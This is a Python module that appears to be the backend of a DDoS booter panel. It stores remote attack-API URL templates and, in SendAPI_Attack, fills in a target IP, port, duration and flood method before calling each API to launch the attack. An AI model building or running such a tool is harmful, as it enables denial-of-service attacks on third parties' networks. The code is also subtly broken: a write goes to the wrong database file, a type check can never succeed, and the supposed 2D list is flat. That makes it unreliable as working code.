import os, sys, time, requests

from ..Config.main import *
from ..auth.crud import *
from ..auth.crudFunc import *

class APICrud:
    """
    Doc
    List of APIs [Format: ID, API Name, API Domain, API Access]
    """
    def listAPIs():
        apiDB = open("./assets/db/apis.db", "r").read()
        apis = apiDB.split("\n")

        api_List = "ID | API Name             API Domain                  API Access\r\n_____________________________________________________________________________\r\n"

        i = 0
        api_c = 0
        for api in apis:
            i += 1
            if len(api) > 5:
                if api.startswith("api_Name="):
                    apiName = api.replace("api_Name=", "")
                    apiURL = apis[i].replace("api_URL=", "")
                    apiMethods = apis[i+1].replace("api_Methods=", "")
                    apiAccess = apis[i+2].replace("api_Access=", "")
                    api_List += f"{str(api_c)}  | {apiName}\t {apiURL[0:31]}\t {apiAccess}\r\n\r\n"
                    api_c+=1

        return api_List

    """
    Returns API info split with commas
    """
    def GetAPI(apiiName):
        apiDB = open("./assets/db/apis.db", "r").read()
        apis = apiDB.split("\n")

        i = 0
        for api in apis:
            i += 1
            if len(api) > 5:
                if api.startswith(f"api_Name={apiiName}"):
                    apiiName = api.replace("api_Name=", "")
                    apiURL = apis[i].replace("api_URL=", "")
                    apiMethods = apis[i+1].replace("api_Methods=", "")
                    apiAccess = apis[i+2].replace("api_Access=", "")
                    return f"{apiiName},{apiURL},{apiMethods},{apiAccess}"
        return "[x] Error, No API Found!"

    """
    Doc
    Return a 2D Array (Format Per Key: [apiName, apiURL])
    """
    def GetAPIWithMethod(method):
        """
        This function return a 2D Array of the APIs to send attack with and the name of the API
        to send back to the client
        """
        apiDB = open("./assets/db/apis.db", "r").read()
        apis = apiDB.split("\n")

        ListOfAPIs = []

        i = 0
        for api in apis:
            i += 1
            if len(api) > 5:
                if api.startswith("api_Methods="):
                    apiiName = apis[i-3].replace("api_Name=", "")
                    apiURL = apis[i-2].replace("api_URL=", "")
                    print(f"{api} {apiiName} | {apiURL}\r\n")
                    if f"|{method}" in api or f"{method}|" in api:
                        ListOfAPIs += [apiiName, apiURL]
        return ListOfAPIs   
                  
    """
    Doc
    Adds an API to the database 
    Note: dup check will be added
    """
    def addAPI(apiName, api, methods, usemode):
        apiDB = open("./assets/db/users.db", "a")
        apiDB.write(f"api_Name={apiName}\napi_URL={api}\napi_Methods={methods}\napi_Access={usemode}\napi_Funnel=N/A\n")
        apiDB.close()
        return f"[+] API: {apiName} successfully added!\r\n"

    """
    Doc
    Removes an API from database
    """
    def removeAPI(apiName):
        apiDB = open("./assets/db/apis.db", "r").read()
        apis = apiDB.split("\n")

        new_apiDB = ""
        i = 0
        for api in apis:
            i+=1
            if len(api) > 5:
                if api.startswith(f"api_Name={apiName}") == False:
                    apiiName = api.replace("api_Name=", "")
                    apiURL = apis[i].replace("api_URL=", "")
                    apiMethods = apis[i+1].replace("api_Methods=", "")
                    apiAccess = apis[i+2].replace("api_Access=", "")
                    new_apiDB += api
        
        w_apiDB = open("./assets/db/apis.db", "w")
        w_apiDB.write(new_apiDB)
        w_apiDB.close()
        return f"[+] API: {apiName} successfully removed!\r\n"
                    

    def updateAPI(apiName, new_api, methods):
        pass

    """
    Doc
    Returns the original method if a renamed method was called
    """
    def fixFunneledMethods(apiName, method):
        apiDB = open("./assets/db/apis.db", "r").read()
        apis = apiDB.split("\n")

        i = 0
        for api in apis:
            i += 1
            if len(api) > 5:
                if api.startswith(f"api_Name={apiName}"):
                    apiiName = api.replace("api_Name=", "")
                    apiURL = apis[i].replace("api_URL=", "")
                    apiMethods = apis[i+1].replace("api_Methods=", "")
                    apiAccess = apis[i+2].replace("api_Access=", "")
                    apiFunnel = apis[i+3].replace("api_Funnel=", "")
                    if "|" in apiFunnel:
                        apiFunnels = apiFunnel.split("|")
                        for Funnel in apiFunnels:
                            if Funnel.split(":")[0] == method:
                                return Funnel.split(":")[1]

        return method
        

class APIFunc:
    """
    Doc
    Sends attack to APIs based on the method being used
    """
    def SendAPI_Attack(ip, port, time, method):
        APIs = APICrud.GetAPIWithMethod(method) ## 2D Array

        Response = ""

        if isinstance(len(APIs), list):
            for u in APIs:
                u[1] = u[1].replace("{ip}", f"{ip}")
                u[1] = u[1].replace("{host}", f"{ip}")
                u[1] = u[1].replace("{port}", f"{port}")
                u[1] = u[1].replace("{time}", f"{time}")
                lol = APICrud.fixFunneledMethods(u[0], method)
                u[1] = u[1].replace("{method}", lol)
                print(f"Line 165 {u}")
                output = requests.get(f"{u[1]}").text
                print(output) ## debug
                Response += f"[+] Attack sent {ip}:{port} for {time} seconds with {method} | {u[0]}\r\n"
        else:
            APIs[1] = APIs[1].replace("{ip}", f"{ip}")
            APIs[1] = APIs[1].replace("{host}", f"{ip}")
            APIs[1] = APIs[1].replace("{port}", f"{port}")
            APIs[1] = APIs[1].replace("{time}", f"{time}")
            lol = APICrud.fixFunneledMethods(APIs[0], method)
            APIs[1] = APIs[1].replace("{method}", lol)
            print(f"Line 174: {APIs[1]}")
            output = requests.get(f"{APIs[1]}").text
            print(output) ## debug
            Response += f"[+] Attack sent {ip}:{port} for {time} seconds with {method} | {APIs[0]}\r\n"

        return Response




